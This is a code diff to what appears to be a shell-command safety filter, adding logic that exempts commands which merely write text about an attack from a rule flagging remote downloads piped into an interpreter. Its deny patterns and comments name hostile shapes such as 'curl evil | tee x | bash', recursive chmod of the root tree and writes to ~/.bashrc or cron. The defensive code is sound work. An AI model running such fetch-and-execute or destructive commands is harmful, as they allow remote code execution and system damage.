@@ -39,6 +39,39 @@ function pipeDownloadIsExternal(cmd) {
   return hosts.some((h) => isExternal(h));   // any external scheme'd target → real RCE
 }
 
+// Blank out quoted spans and heredoc bodies, leaving roughly the words a shell
+// would actually execute. Placeholders (not empty) so neighbouring tokens can't
+// glue into a new one. Bounded, non-backtracking pieces — see bench/redos.mjs.
+function shellSkeleton(cmd) {
+  return String(cmd)
+    .replace(/<<-?\s*(['"]?)([A-Za-z_]\w{0,30})\1[\s\S]*?^[ \t]*\2[ \t]*$/gm, ' <<HEREDOC ')
+    .replace(/'[^']{0,4000}'/g, " '' ")
+    .replace(/"(?:[^"\\]{0,4000}|\\.)*"/g, ' "" ');
+}
+
+// Writing *about* a dangerous command is not running it. `echo "curl x | bash"
+// >> notes.md` documents an attack; it executes nothing. PIPE_INTERP matches the
+// RAW command on purpose (a quoted URL must still be seen), so prose like that
+// scored black — the false positive this exempts.
+//
+// Everything that could actually execute the quoted text is excluded first:
+//   - the shape survives quote-stripping  → a real pipeline (`curl x | bash`)
+//   - the skeleton still pipes or chains  → `echo "…" | bash` genuinely feeds the
+//     text to a shell, and `echo "…" > x.sh && sh x.sh` runs it on the next clause
+//   - an interpreter sits in the skeleton → `bash -c "…"`, `python <<EOF`
+// Only then, and only for a lone text sink with a redirect, is it prose.
+// Persistence targets are unaffected: a write to ~/.bashrc or cron is caught by
+// the rule on its *destination*, whatever the content happens to say.
+const TEXT_SINK_RE = /^\s*(?:echo|printf|cat|tee)\b[^;&|]{0,200}?(?:>>?\s*\S+|<<HEREDOC)/;
+const INTERP_WORD_RE = /\b(?:(?:ba)?sh|zsh|dash|ash|ksh|python[0-9.]*|node|ruby|perl|php|eval|source|xargs)\b/i;
+function isProseAboutACommand(cmd) {
+  const skel = shellSkeleton(cmd);
+  if (PIPE_INTERP.test(skel)) return false;    // shape outside quotes → real pipeline
+  if (/[;|]|&&/.test(skel)) return false;      // any pipe/chain → the text may be executed
+  if (INTERP_WORD_RE.test(skel)) return false; // interpreter in command position
+  return TEXT_SINK_RE.test(skel);
+}
+
 export const BLACK_SHELL = [
   // bounded quantifiers (no adjacent `[a-z]*r[a-z]*`, no unbounded lazy gap) so a
   // long flag run like `rm -rrr…` can't trigger quadratic backtracking (ReDoS):
@@ -50,7 +83,7 @@ export const BLACK_SHELL = [
   // [^;\n]* (not [^|]*) so a download piped THROUGH filters (tee/gunzip/sed/xxd/
   // tac/rev) into an interpreter — `curl evil | tee x | bash` — is still caught,
   // staying within one pipeline (no ; to a separate command).
-  { re: PIPE_INTERP, why: 'pipe remote download to an interpreter (RCE)', gate: pipeDownloadIsExternal },
+  { re: PIPE_INTERP, why: 'pipe remote download to an interpreter (RCE)', gate: (cmd) => pipeDownloadIsExternal(cmd) && !isProseAboutACommand(cmd) },
   // recursive chmod of the root/system tree — any mode is destructive there:
   // 777 opens it world-writable, 000 locks even root out. Reuses the rm rule's
   // target clause so a benign deploy `chmod -R 755 /home/app/dist` (deep path)
